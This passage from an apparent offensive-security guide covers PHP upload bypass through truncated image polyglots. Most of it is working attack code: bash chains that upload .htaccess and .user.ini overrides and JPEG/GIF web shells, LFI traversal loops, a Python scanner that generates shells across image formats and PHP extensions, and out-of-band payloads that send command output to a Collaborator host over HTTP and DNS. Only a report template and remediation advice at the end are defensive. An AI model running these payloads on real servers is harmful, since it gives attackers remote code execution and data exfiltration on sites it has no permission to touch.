        -F "${FIELD}=@${payload_file};filename=${BASENAME%.${ORIG_EXT}}.php.${ORIG_EXT};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] .php.${ORIG_EXT} → ACCEPTED (double ext)"

  done
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Handler Override + Truncated Shell Chain"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  TARGET="https://target.com"

  echo "═══ Two-Stage Truncation Chain ═══"

  # ── Stage 1: Upload handler override ──
  # .htaccess method
  echo 'AddType application/x-httpd-php .jpg .png .gif' > .htaccess
  curl -s -o /dev/null -w "[%{http_code}] .htaccess\n" -X POST "$UPLOAD_URL" \
    -F "file=@.htaccess;filename=.htaccess" -H "Cookie: $COOKIE"

  # .user.ini method (for PHP-FPM)
  echo 'auto_prepend_file=shell.jpg' > .user.ini
  curl -s -o /dev/null -w "[%{http_code}] .user.ini\n" -X POST "$UPLOAD_URL" \
    -F "file=@.user.ini;filename=.user.ini" -H "Cookie: $COOKIE"

  # Self-executing .htaccess (single-stage RCE)
  cat > .htaccess_self << 'EOF'
  php_value auto_prepend_file .htaccess
  #<?php system($_GET['cmd']); die(); ?>
  EOF
  curl -s -o /dev/null -w "[%{http_code}] self-exec .htaccess\n" -X POST "$UPLOAD_URL" \
    -F "file=@.htaccess_self;filename=.htaccess" -H "Cookie: $COOKIE"

  # ── Stage 2: Upload truncated shell as image ──
  # This passes ALL content validation because it's a valid image
  # with PHP hidden in truncation

  # JPEG truncated shell
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > shell.jpg
  echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
  curl -s -o /dev/null -w "[%{http_code}] truncated JPEG shell\n" -X POST "$UPLOAD_URL" \
    -F "file=@shell.jpg;type=image/jpeg" -H "Cookie: $COOKIE"

  # GIF truncated shell (even simpler)
  echo -n 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
  curl -s -o /dev/null -w "[%{http_code}] truncated GIF shell\n" -X POST "$UPLOAD_URL" \
    -F "file=@shell.gif;type=image/gif" -H "Cookie: $COOKIE"

  # Genuine image with hidden PHP
  if [ -f "genuine_trunc_system.jpg" ]; then
      cp genuine_trunc_system.jpg shell_genuine.jpg
      curl -s -o /dev/null -w "[%{http_code}] genuine JPEG+PHP\n" -X POST "$UPLOAD_URL" \
        -F "file=@shell_genuine.jpg;type=image/jpeg" -H "Cookie: $COOKIE"
  fi

  # ── Stage 3: Trigger ──
  echo ""
  echo "─── Verification ───"
  for dir in uploads files media images; do
      for f in shell.jpg shell.gif shell_genuine.jpg; do
          RESULT=$(curl -s "${TARGET}/${dir}/${f}?cmd=echo+TRUNC_RCE" 2>/dev/null)
          if echo "$RESULT" | grep -q "TRUNC_RCE"; then
              echo "[!!!] RCE CONFIRMED: ${TARGET}/${dir}/${f}?cmd=COMMAND"
          fi
      done
  done

  # For .user.ini chain, access any .php file
  sleep 10  # Wait for .user.ini cache
  for dir in uploads files media; do
      for f in index.php info.php; do
          RESULT=$(curl -s "${TARGET}/${dir}/${f}?cmd=echo+TRUNC_RCE" 2>/dev/null)
          echo "$RESULT" | grep -q "TRUNC_RCE" && echo "[!!!] .user.ini RCE: ${TARGET}/${dir}/${f}"
      done
  done

  rm -f .htaccess .htaccess_self .user.ini shell.jpg shell.gif shell_genuine.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="LFI + Truncated Image → RCE"}
  ```bash
  # ═══════════════════════════════════════════════
  # If the target has Local File Inclusion (LFI), truncated
  # images with PHP in their structure execute when included
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"
  UPLOAD_URL="${TARGET}/api/upload"
  COOKIE="session=TOKEN"

  # Upload truncated image with PHP
  python3 -c "
  import struct
  shell = b'<?php echo \"TRUNC_LFI_RCE_CONFIRMED\"; system(\$_GET[\"cmd\"]); ?>'
  data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  data += b'\xff\xfe' + struct.pack('>H', len(shell)+2) + shell
  data += b'\xff\xd9'
  open('/tmp/lfi_trunc.jpg', 'wb').write(data)
  "

  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/lfi_trunc.jpg;filename=avatar.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # Try various LFI paths to include the uploaded image
  for lfi_param in page file include path template load view doc; do
      for depth in 1 2 3 4 5 6; do
          TRAVERSAL=$(printf '../%.0s' $(seq 1 $depth))
          URL="${TARGET}/index.php?${lfi_param}=${TRAVERSAL}uploads/avatar.jpg%00&cmd=id"
          RESULT=$(curl -s "$URL" 2>/dev/null)
          if echo "$RESULT" | grep -q "TRUNC_LFI_RCE_CONFIRMED"; then
              echo "[!!!] LFI+TRUNCATION RCE:"
              echo "    URL: ${URL}"
              echo "    Output: $(echo "$RESULT" | grep 'uid=' | head -1)"
              break 2
          fi
      done
  done

  rm -f /tmp/lfi_trunc.jpg
  ```
  :::
::

---

## Comprehensive Truncation Scanner

::code-collapse
```python [truncation_scanner.py]
#!/usr/bin/env python3
"""
File Signature Truncation Scanner
Generates truncated payloads for every image format and tests
them against the target upload endpoint with multiple extension
and Content-Type strategies.
"""
import requests
import struct
import zlib
import os
import time
import itertools
import urllib3
urllib3.disable_warnings()

class TruncationScanner:

    SHELLS = {
        'system':  b'<?php system($_GET["cmd"]); ?>',
        'eval':    b'<?php eval($_POST["e"]); ?>',
        'minimal': b'<?=`$_GET[c]`?>',
    }

    def __init__(self, upload_url, field="file", cookies=None):
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 20
        if cookies:
            self.session.cookies.update(cookies)
        self.base_url = upload_url.rsplit('/', 2)[0]
        self.results = {'accepted': [], 'total': 0}

    # ── Payload Generators ──

    def jpeg_minimal(self, shell):
        return b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' + shell

    def jpeg_com(self, shell):
        data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        data += b'\xff\xfe' + struct.pack('>H', len(shell) + 2) + shell
        data += b'\xff\xd9'
        return data

    def jpeg_full_header(self, shell, w=100, h=100):
        data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        data += b'\xff\xfe' + struct.pack('>H', len(shell) + 2) + shell
        qt = bytes(range(64))
        data += b'\xff\xdb' + struct.pack('>H', len(qt) + 3) + b'\x00' + qt
        sof = struct.pack('>BHH', 8, h, w) + b'\x01\x11\x00'
        data += b'\xff\xc0' + struct.pack('>H', len(sof) + 2) + sof
        dht = b'\x00' + bytes(17) + b'\x00'
        data += b'\xff\xc4' + struct.pack('>H', len(dht) + 2) + dht
        sos = b'\x01\x01\x00\x00\x3f\x00'
        data += b'\xff\xda' + struct.pack('>H', len(sos) + 2) + sos
        data += b'\x00\x00\xff\xd9'
        return data

    def jpeg_app_segments(self, shell):
        data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        for marker in [b'\xff\xec', b'\xff\xed', b'\xff\xee']:
            data += marker + struct.pack('>H', len(shell) + 2) + shell
        data += b'\xff\xd9'
        return data

    def png_minimal(self, shell):
        return b'\x89PNG\r\n\x1a\n' + shell

    def png_with_ihdr(self, shell):
        data = b'\x89PNG\r\n\x1a\n'
        ihdr = struct.pack('>IIBBBBB', 100, 100, 8, 2, 0, 0, 0)
        ihdr_crc = struct.pack('>I', zlib.crc32(b'IHDR' + ihdr) & 0xffffffff)
        data += struct.pack('>I', 13) + b'IHDR' + ihdr + ihdr_crc
        text_data = b'Comment\x00' + shell
        text_crc = struct.pack('>I', zlib.crc32(b'tEXt' + text_data) & 0xffffffff)
        data += struct.pack('>I', len(text_data)) + b'tEXt' + text_data + text_crc
        iend_crc = struct.pack('>I', zlib.crc32(b'IEND') & 0xffffffff)
        data += struct.pack('>I', 0) + b'IEND' + iend_crc
        return data

    def gif_minimal(self, shell):
        return b'GIF89a' + shell

    def gif_with_comment(self, shell):
        gif = bytearray(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00')
        gif += b'\x21\xfe' + bytes([min(len(shell), 255)]) + shell[:255] + b'\x00'
        gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
        return bytes(gif)

    def bmp_truncated(self, shell):
        header = b'BM' + struct.pack('<I', 54 + len(shell))
        header += b'\x00\x00\x00\x00' + struct.pack('<I', 54)
        header += struct.pack('<I', 40) + struct.pack('<ii', 1, 1)
        header += struct.pack('<HH', 1, 24) + b'\x00' * 24
        return header + shell

    # ── Upload & Test ──

    def upload(self, content, filename, ct='image/jpeg'):
        files = {self.field: (filename, content, ct)}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=20)
            ok = r.status_code in [200, 201] and any(
                w in r.text.lower() for w in ['success', 'upload', 'saved', 'url', 'path', 'file']
            ) and not any(
                w in r.text.lower() for w in ['error', 'invalid', 'denied', 'blocked', 'forbidden']
            )
            return ok, r.status_code
        except:
            return False, 0

    def scan(self, delay=0.2):
        """Run comprehensive truncation scan"""

        generators = {
            'jpeg_min':      (self.jpeg_minimal, 'jpg', 'image/jpeg'),
            'jpeg_com':      (self.jpeg_com, 'jpg', 'image/jpeg'),
            'jpeg_full':     (self.jpeg_full_header, 'jpg', 'image/jpeg'),
            'jpeg_appseg':   (self.jpeg_app_segments, 'jpg', 'image/jpeg'),
            'png_min':       (self.png_minimal, 'png', 'image/png'),
            'png_ihdr':      (self.png_with_ihdr, 'png', 'image/png'),
            'gif_min':       (self.gif_minimal, 'gif', 'image/gif'),
            'gif_comment':   (self.gif_with_comment, 'gif', 'image/gif'),
            'bmp_trunc':     (self.bmp_truncated, 'bmp', 'image/bmp'),
        }

        ext_strategies = {
            'original':    lambda orig: orig,           # .jpg
            'php':         lambda orig: 'php',          # .php
            'phtml':       lambda orig: 'phtml',        # .phtml
            'php5':        lambda orig: 'php5',         # .php5
            'pht':         lambda orig: 'pht',          # .pht
            'phar':        lambda orig: 'phar',         # .phar
            'double':      lambda orig: f'php.{orig}',  # .php.jpg
            'double_rev':  lambda orig: f'{orig}.php',  # .jpg.php
        }

        print(f"\n{'='*60}")
        print(f" File Signature Truncation Scanner")
        print(f"{'='*60}")
        print(f"[*] Target: {self.upload_url}")
        print(f"[*] Generators: {len(generators)}")
        print(f"[*] Shells: {len(self.SHELLS)}")
        print(f"[*] Extensions: {len(ext_strategies)}")
        total_tests = len(generators) * len(self.SHELLS) * len(ext_strategies)
        print(f"[*] Total tests: {total_tests}")
        print("-" * 60)

        for gen_name, (gen_func, orig_ext, ct) in generators.items():
            for shell_name, shell_code in self.SHELLS.items():
                content = gen_func(shell_code)

                for ext_name, ext_func in ext_strategies.items():
                    final_ext = ext_func(orig_ext)
                    filename = f'trunc_{gen_name}_{shell_name}.{final_ext}'

                    self.results['total'] += 1
                    ok, status = self.upload(content, filename, ct)

                    if ok:
                        self.results['accepted'].append({
                            'generator': gen_name,
                            'shell': shell_name,
                            'extension': final_ext,
                            'filename': filename,
                            'status': status,
                            'size': len(content),
                        })
                        print(f"[+] {gen_name:15s} | {shell_name:10s} | .{final_ext:12s} → ACCEPTED")

                    time.sleep(delay)

            # Progress
            print(f"[*] Completed: {gen_name}")

        self._report()
        return self.results

    def _report(self):
        print(f"\n{'='*60}")
        print(f" RESULTS: {len(self.results['accepted'])}/{self.results['total']} accepted")
        print(f"{'='*60}")

        if self.results['accepted']:
            # Group by generator
            by_gen = {}
            for r in self.results['accepted']:
                by_gen.setdefault(r['generator'], []).append(r)

            for gen, items in by_gen.items():
                print(f"\n  [{gen}]:")
                for item in items:
                    print(f"    .{item['extension']:12s} ({item['shell']}) — {item['size']} bytes")

            # Best candidates
            print(f"\n[*] Best exploitation candidates:")
            for r in self.results['accepted']:
                if r['extension'] in ['php', 'phtml', 'php5', 'pht']:
                    print(f"    ★ {r['filename']} — Direct execution possible!")


if __name__ == "__main__":
    scanner = TruncationScanner(
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    )
    scanner.scan(delay=0.3)
```
::

---

## Verification & Execution Confirmation

::tabs
  :::tabs-item{icon="i-lucide-check-circle" label="Shell Discovery & Verification"}
  ```bash
  TARGET="https://target.com"

  echo "═══ Truncation Shell Verification ═══"

  # Search all common upload directories for all uploaded files
  DIRS=(uploads files media images static assets content data tmp Uploads)
  FILES=(
      # Direct PHP extensions
      trunc_jpeg_com_system.php trunc_jpeg_com_system.phtml
      trunc_jpeg_com_system.php5 trunc_jpeg_com_system.pht
      # Double extensions
      trunc_jpeg_com_system.php.jpg trunc_gif_min_system.php.gif
      # Image extensions (need handler override)
      shell.jpg shell.gif shell_genuine.jpg
      # Post-EOF
      posteof_jpeg.jpg posteof_gif.gif posteof_png.png
      # Genuine truncation
      genuine_trunc_system.phtml genuine_trunc_system.php.jpg
  )

  for dir in "${DIRS[@]}"; do
      for f in "${FILES[@]}"; do
          URL="${TARGET}/${dir}/${f}"
          RESULT=$(curl -s --max-time 3 "${URL}?cmd=echo+TRUNC_VERIFY_$(date+%s)" 2>/dev/null)
          if echo "$RESULT" | grep -q "TRUNC_VERIFY"; then
              echo "[!!!] RCE CONFIRMED: ${URL}"
              echo "    → curl '${URL}?cmd=id'"
              curl -s "${URL}?cmd=id" | head -3
              echo ""
          fi
      done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Out-of-Band Verification"}
  ```bash
  COLLAB="YOUR_COLLAB_ID.oastify.com"

  # Create truncated shell with OOB callback
  python3 -c "
  import struct
  shell = b'<?php file_get_contents(\"http://${COLLAB}/trunc_rce_confirmed\"); ?>'
  data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  data += b'\xff\xfe' + struct.pack('>H', len(shell)+2) + shell + b'\xff\xd9'
  open('/tmp/oob_trunc.jpg', 'wb').write(data)
  "

  curl -X POST "https://target.com/api/upload" \
    -F "file=@/tmp/oob_trunc.jpg;filename=oob.phtml;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  # Trigger it
  curl -s "https://target.com/uploads/oob.phtml" &>/dev/null

  echo "[*] Check Burp Collaborator for 'trunc_rce_confirmed' callback"

  # DNS-based verification
  python3 -c "
  import struct
  shell = b'<?php \\\$x=exec(\"id\"); dns_get_record(\"\\\$x.trunc.${COLLAB}\",DNS_A); ?>'
  data = b'GIF89a' + shell
  open('/tmp/oob_dns.gif', 'wb').write(data)
  "

  curl -X POST "https://target.com/api/upload" \
    -F "file=@/tmp/oob_dns.gif;filename=dns.phtml;type=image/gif" \
    -H "Cookie: session=TOKEN"

  curl -s "https://target.com/uploads/dns.phtml" &>/dev/null

  rm -f /tmp/oob_trunc.jpg /tmp/oob_dns.gif
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Safe PoC for Reports"}
  ```bash
  TIMESTAMP=$(date +%s)
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # Create harmless truncated JPEG PoC (no command execution)
  python3 -c "
  import struct

  poc = f'<?php echo \"TRUNCATION_POC_{${TIMESTAMP}}\"; echo \" | Server: \".php_uname(); echo \" | PHP: \".phpversion(); ?>'.encode()

  data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  data += b'\xff\xfe' + struct.pack('>H', len(poc)+2) + poc
  data += b'\xff\xd9'

  open('poc_trunc_${TIMESTAMP}.jpg', 'wb').write(data)
  print(f'[+] Created PoC: {len(data)} bytes')
  "

  # Upload
  curl -X POST "$UPLOAD_URL" \
    -F "file=@poc_trunc_${TIMESTAMP}.jpg;filename=poc_${TIMESTAMP}.phtml;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # Verify
  curl -s "https://target.com/uploads/poc_${TIMESTAMP}.phtml"

  echo ""
  echo "═══ Report ═══"
  echo "Title: RCE via File Signature Truncation — PHP Code in Truncated JPEG COM Segment"
  echo "Severity: Critical (CVSS 9.8)"
  echo "Endpoint: POST /api/upload"
  echo "Technique: JPEG file with valid header structure, PHP code embedded in COM segment"
  echo "Bypass: File passes magic byte check, JFIF validation, and getimagesize()"
  echo "PoC ID: ${TIMESTAMP}"
  ```
  :::
::

---

## Reporting & Remediation

### Report Structure

::steps{level="4"}

#### Title
`Remote Code Execution via File Signature Truncation — PHP Code in Truncated [JPEG/PNG/GIF] Header at [Endpoint]`

#### Root Cause
The application validates uploaded files by checking only the file signature (magic bytes) and/or partial header structure. It does not validate the complete file integrity or check for executable code embedded within or after the valid file structure. A truncated image file containing PHP code in its [COM segment / tEXt chunk / comment extension / post-EOF area] passes validation because the initial bytes constitute a valid image header.

#### Reproduction Steps
```bash
# 1. Create truncated JPEG with PHP in COM segment
python3 -c "import struct; shell=b'<?php echo php_uname(); ?>'; data=b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xfe'+struct.pack('>H',len(shell)+2)+shell+b'\xff\xd9'; open('poc.jpg','wb').write(data)"

# 2. Upload (passes validation as valid JPEG)
curl -X POST "https://target.com/api/upload" \
  -F "file=@poc.jpg;filename=poc.phtml;type=image/jpeg" \
  -H "Cookie: session=TOKEN"

# 3. Verify execution
curl "https://target.com/uploads/poc.phtml"
```

#### Impact
An attacker can upload a file that passes all content validation checks (it IS a valid JPEG) but contains executable PHP code. When the file is included or executed by the web server, the attacker gains full Remote Code Execution.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Full File Structure Validation
  ---
  Don't just check magic bytes. Use image libraries (`imagecreatefromjpeg()`, `Pillow`, `ImageIO`) to **fully parse and re-encode** the image. If the file cannot be completely decoded and re-saved as a valid image, reject it.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Re-encode All Uploads
  ---
  Process every uploaded image through an image library and save a **new, clean copy**. This strips all metadata, COM segments, text chunks, post-EOF data, and any embedded code. The re-encoded file contains ONLY pixel data.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Strip All Metadata
  ---
  Remove EXIF, IPTC, XMP, ICC profiles, COM segments, tEXt/zTXt/iTXt chunks, and all non-essential data from uploaded images.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Whitelist Extensions + Random Names
  ---
  Allow only `.jpg`, `.png`, `.gif` extensions. Generate random filenames server-side. Never use uploaded filenames directly.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable Execution in Upload Directory
  ---
  Configure the web server to never execute scripts in upload directories. This prevents truncated shells from executing even if they bypass content validation.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Never Include Uploaded Files
  ---
  Never use `include()`, `require()`, or similar functions on uploaded files. If LFI vulnerabilities exist, truncated images become RCE vectors.
  :::
::